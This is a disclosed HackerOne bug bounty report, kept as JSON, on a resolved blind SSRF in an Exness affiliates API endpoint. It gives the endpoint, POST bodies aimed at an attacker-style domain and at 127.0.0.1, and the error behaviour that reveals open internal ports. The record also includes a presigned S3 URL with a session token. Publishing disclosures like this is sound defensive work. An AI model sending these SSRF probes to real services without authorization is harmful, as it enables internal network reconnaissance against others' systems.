{
  "id": 1832494,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODMyNDk0",
  "url": "https://hackerone.com/reports/1832494",
  "title": "Blind SSRF on https://my.exnessaffiliates.com/ allows for internal network enumeration",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2023-01-12T13:49:27.027Z",
  "submitted_at": "2023-01-12T13:49:27.283Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "null_hypothesis",
    "url": "/null_hypothesis",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/919/2effe36d9a514cd008bde34f73aaec8546c123bb_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 12719,
    "url": "https://hackerone.com/exness",
    "handle": "exness",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/719/cbbefceced84ac5354697307cb78a19df85a633f_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/719/cbbefceced84ac5354697307cb78a19df85a633f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "EXNESS",
      "twitter_handle": "",
      "website": "https://www.exness.com",
      "about": "We provide best trading conditions across multiple markets for clients all over the world."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-10-25T13:09:58.717Z",
  "bug_reporter_agreed_on_going_public_at": "2023-10-25T13:09:58.620Z",
  "team_member_agreed_on_going_public_at": "2023-07-13T13:23:16.514Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "## Summary:\nHi\nHope you're well\nI have found a Blind SSRF vulnerability, in an endpoint on exnessaffiliates.com endpoint, which would allow for Internal network enumeration.\n\nThe endpoint in question is \n`https://my.exnessaffiliates.com/api/partner_integrations/template/probe`\n\nWhen an attacker makes a POST request, with the post data:\n```\n{\"data\":{\"url\":\"https://attacker-domain.tld\"}}\n```\n\nWe can see a DNS and HTTP request being made as so:\n```\nGET / HTTP/1.1\nHost: sa66ovrblrbiviochnojtli2bthk5ft4.oastify.com\nsentry-trace: xxx,baggage: sentry-trace_id=xxx,sentry-environment=production,sentry-public_key=xxx,sentry-transaction=/api/v1/partners/%7Bpartner_partner_uid%7D/integrations/\nUser-Agent: python-requests/2.28.1\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nuber-trace-id: xxx\n```\n\nThis is itself, would constitute a minor Blind SSRF vulnerability, if it is not intentionally accepted.\n\nHowever, if we use the post data:\n```\n{\"data\":{\"url\":\"https://127.0.0.1:80\"}}\n```\n\nNormally, if the port/host is not reachable, it will return a simple error:\n```\n\"code\":\"ValidationError\",\"message\":\"Invalid input.\",\"details\":[{\"field\":\"url\",\"message\":\"Invalid Postback URL\",\"code\":\"invalid\"}]\n```\n\nHowever, if the port is open, Python Requests is returning the error message to the user as so:\n{F2117769}\n\nThis indicates that the HTTP port 80 on 127.0.0.1 is open.\n\nWith permission, I will further this attack to inspect the internal network.\n\n\n## Steps to Reproduce:\n[Add details for how we can reproduce the issue. Please ensure reproducibility of the issue.]\n\n  1. Make a POST request to https://my.exnessaffiliates.com/api/partner_integrations/template/probe/\n       with the post data \n      {\"data\":{\"url\":\"https://127.0.0.1:80\"}}\n\n\n## Impact\nHow does the issue affect the business or the user? \nInternal network details are disclosed.\n\nWhat can the attacker get through the issue? \nInternal network device enumeration\nUtilise the requests for DDOS on a victim's server.\n\n\nCan the issue be escalated further? If so, how? \nPotentially, I will attempt further escalation with permission.\n\n## Mitigation\nDo not return Python errors to the user - even when URL contains blacklisted contents.\n\n\n## Supporting Material/References:\nattached above.\n\n## Impact\n\nCurrently, this will allow for network enumeration from the internal IP:\n███████\nWith permission, I will attempt to escalate this issue to inspect the internal network further, and attempt RCE.",
  "bounty_amount": "2000.0",
  "formatted_bounty": "$2,000",
  "weakness": {
    "id": 68,
    "name": "Server-Side Request Forgery (SSRF)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 2117769,
      "file_name": "image.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/he2m5kmuthpgrur7l1hki0v62h8p?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4PQXJMPW%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143350Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCICrJNZtAQyR4yHxSQ0EIGny4fkeHckX0t3yoG9wD5uQNAiAuD4L%2FOIA2BztnLAmlWThGnLw8A%2Bag%2BA3VOZdivE%2FStyqxBQh3EAMaDDAxMzYxOTI3NDg0OSIMSo4Dr9SHrVHPRL2HKo4FxYNKUruPSePgCd1l6bgp5eqBSMMY1e5L6fn8kkGlKYLOhzuezRFkxDDPQvUiIUEEOfFC0RTdzZzteczeHg77xpiEw9At3uzKd1yJTMvShQo8bf%2BHj%2F0m0%2Bh8FQr0WBXWG13xK2%2F38d%2Fa2D9UUg7OZjVOgHlRa76Z3e5MnhWTjSXKM%2BWnjnCvmbgZPjs9I1HxXUgckBQrRCYOgjPkah9B3l2tedY4LLtkMqZIsU3gIN8Jgo8p1N%2BaH2Bn9hxvioG0EWwxMrZ7oPYXgLTAl1bY4trBOyQLGfWIAhhuvCvKu6DTZUxgCDyiDk%2B0x8mAj175TtmmbBoOfkHlsnLxR9fkOLxBjp%2FddrpIFtGYKB%2FK0O1ECilZrCH3rZNknhbQDA%2F2vtYZ%2FDnsZIsXO3xV1dViOHKJ6PBdGBBAw4EAT6%2B34vQofS498Volt4Fsm2fA8YMUFdl6kYPt8OlTJT9Gm5OWvtXssQPFX6w3hRxWmRfUEwpbELfYppgVDsjQy08Z9f5cOYMf2k4arKIm5%2BSUZal9qLfwY81Ym9g5YlYf7dBkke4egepnldwARszt0UPpoEoQh%2BafKUN4zG%2BOOyZphjwBeBj1cLmnJAU%2B4N6MQpMMmJ%2Fpcak9ISCGlXe7xoPiESxkL%2F8B32PartiEL9C0CSGg65XMGQMMP2O2SlVpDNLUtaPcGciXDIeFFLeHR8qciEHUYwAZnZkIsGKtgBfFxl8Nm2Mmeu40c%2FBA70kG4l7N1GihJMYYr8o0NLyRsIXWqK%2F264sGVbxVSpZUkqnadxyikf1YTXWfxhHlW4swsDGKto9SYGDgy8br6bls9zXo1ZvNZ5oPhzUGLsnLh73vBIslvajzCTvhd4z59xXG15F3MJrsra4GOrIB082nmQplUsJvmu61HuuuadZBpsN9IzXY1oyixQGALd2auP1Cjfnaj%2FyF0ZWJzTXnS3zVygjxj1kUeSIcFeD91C%2BTIngNtW8UKah5xB%2Br1vNUZCkKzATUuZyVkcee7RBkKaD1%2BA%2FSNDyKlCCo3y5YIk3x2MDV9yKnLBFlASZRWaOfcYYME9oGrA34Iiwlr52ufMgoAYMDGOq0tDEEqsKzTMVl%2FGXNPgTeSBPOMKtaXW%2BEDQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6fa691313b23ad824ae0735698997a2fef19a16310292d00922ef6e9ee618bf8",
      "file_size": 44383,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 103,
  "voters": [
    "8910jq",
    "datsuraku147",
    "dreamnailxx",
    "alganad",
    "shreyaschavhan",
    "n1m0",
    "ganeshbagaria",
    "mrmax4o4",
    "testt0",
    "drsniper",
    "and 93 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 6.1,
    "author_type": "User",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 440313,
    "asset_type": "URL",
    "asset_identifier": "exnessaffiliates.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
